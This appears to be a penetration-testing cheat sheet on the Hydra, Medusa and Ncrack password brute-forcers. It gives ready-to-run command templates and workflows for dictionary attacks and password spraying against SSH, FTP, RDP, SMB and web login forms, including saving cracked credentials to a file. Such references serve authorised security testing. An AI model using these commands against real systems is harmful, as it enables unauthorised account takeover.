# 🛠️ Tool Master Guide: Hydra & Medusa Online Password Brute-Forcers

> [!INFO] 📋 **Root Metadata**
> - **Category**: Online Multi-Protocol Network Login Brute-Forcers
> - **Tools Covered**: THC Hydra, Medusa, Ncrack
> - **Installations**: Pre-installed on Kali Linux (`sudo apt install -y hydra medusa ncrack`)
> - **Binary Paths**: `/usr/bin/hydra`, `/usr/bin/medusa`, `/usr/bin/ncrack`
> - **Primary Objective**: Performs high-speed parallel dictionary attacks and password spraying against remote network authentication services including SSH, FTP, RDP, SMB, Telnet, MySQL, PostgreSQL, SNMP, and HTTP POST Login Forms.

---

## 📋 1. Hydra Protocol Syntax & Target Matrix

| Target Protocol | Command Syntax Template | Operational Description |
| :--- | :--- | :--- |
| **SSH (Port 22)** | `hydra -l root -P rockyou.txt 10.10.10.50 ssh -t 16` | Multi-threaded SSH password brute-force |
| **FTP (Port 21)** | `hydra -L users.txt -P rockyou.txt 10.10.10.50 ftp` | Multi-user FTP dictionary attack |
| **RDP (Port 3389)** | `hydra -l Administrator -P rockyou.txt rdp://10.10.10.50 -t 4` | Remote Desktop Protocol brute-forcing |
| **SMB / NetBIOS** | `hydra -L users.txt -p Password123! smb://10.10.10.50` | Active Directory SMB password spraying |
| **HTTP POST Form** | `hydra -l admin -P rockyou.txt 10.10.10.50 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` | Web application POST form login attack |

---

## 📋 2. Exhaustive Flag Reference Matrix

| Flag | Argument Type | Description & Technical Function | Syntax Example |
| :--- | :--- | :--- | :--- |
| `-l <user>` | String | Single target username | `-l admin` |
| `-L <file>` | File Path | File containing list of usernames | `-L usernames.txt` |
| `-p <pass>` | String | Single target password (useful for password spraying) | `-p Winter2026!` |
| `-P <file>` | File Path | File containing list of passwords | `-P rockyou.txt` |
| `-t <threads>`| Integer | Number of parallel connection threads (default: 16) | `-t 64` |
| `-V / -v` | Boolean | Enables verbose output / displays tested user:pass pairs | `-V` |
| `-o <file>` | File Path | Saves successfully authenticated credentials to text file | `-o valid_creds.txt` |
| `-f` | Boolean | Exits hydra execution upon finding first valid credential pair | `-f` |

---

## 💻 3. Operational Command Workflows

### Scenario A: Multi-Threaded SSH Login Password Spraying
```bash
# Test single valid password across list of discovered usernames
hydra -L users.txt -p "Summer2026!" -t 16 -V -o valid_ssh.txt 10.10.10.50 ssh
```

### Scenario B: Web Application HTTP POST Form Brute-Forcing
```bash
# Brute-force admin account on web login form, matching failure string "Invalid username or password"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.50 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password" -v -o web_cracked.txt
```
